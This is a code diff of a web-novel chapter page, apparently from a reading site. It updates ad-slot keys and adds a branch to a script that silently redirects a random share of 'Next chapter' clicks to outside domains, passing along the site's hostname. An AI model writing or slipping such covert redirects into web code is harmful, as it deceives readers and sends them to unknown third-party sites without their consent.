@@ -2393,7 +2393,7 @@
                 <p>&#34;Exactly as prescribed.&#34; His Adam&#39;s apple bobbed. &#34;But my throat feels like I swallowed razor blades.&#34;</p>
                 <p>She picked up a tongue depressor. &#34;Open wide—&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>Under the clinical lights, his tonsils glared an angry red.</p>
                 <p>&#34;Severe inflammation.&#34; Her brow furrowed. &#34;More fluids. Less talking.&#34;</p>
                 <p>&#34;An IV would be faster.&#34; He loosened his tie.</p>
@@ -2409,7 +2409,7 @@
                 <p>His lips quirked. &#34;Consider it practice.&#34;</p>
                 <p>The needle found its mark on the first try.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>After securing the tape, Evelyn turned to leave.</p>
                 <p>The tail of her coat caught in his grip.</p>
                 <p>&#34;Something else?&#34; She didn&#39;t turn around.</p>
@@ -2425,7 +2425,7 @@
                 <p>&#34;Actually...&#34; She gazed at the swaying plane trees outside. &#34;I can think about Dad now without crying.&#34;</p>
                 <p>The IV tube glinted faintly.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>&#34;He always said...&#34; Her voice was barely audible. &#34;Evelyn should be like a cedar.&#34;</p>
                 <p>&#34;You are.&#34; The words came unexpectedly.</p>
                 <p>She arched a brow. &#34;Stubborn?&#34;</p>
@@ -2555,7 +2555,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2571,8 +2571,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
